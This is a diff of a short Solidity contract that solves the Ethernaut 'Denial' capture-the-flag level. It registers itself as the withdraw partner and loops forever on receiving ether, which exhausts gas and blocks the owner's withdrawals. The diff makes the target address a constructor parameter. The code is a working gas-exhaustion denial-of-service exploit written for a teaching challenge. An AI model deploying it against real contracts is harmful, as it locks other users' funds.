@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.20;
 
 /**
  * @title 20. STOP
@@ -10,8 +10,12 @@ interface IDenial {
     function setWithdrawPartner(address _partner) external;
 }
 
-contract Ethernaut_Stop {
-    IDenial idenial = IDenial(0xA5aCd27F60246ebdA0dF9E55Dd78f394715747c4);
+contract Stop {
+    IDenial idenial;
+
+    constructor(address _denial) {
+        idenial = IDenial(_denial);
+    }
 
     // 1. Let's start by becoming a partner...
     function becomePartner() public {
@@ -24,5 +28,3 @@ contract Ethernaut_Stop {
         while (true) {}
     }
 }
-
-// 🎉 Level completed! 🎉
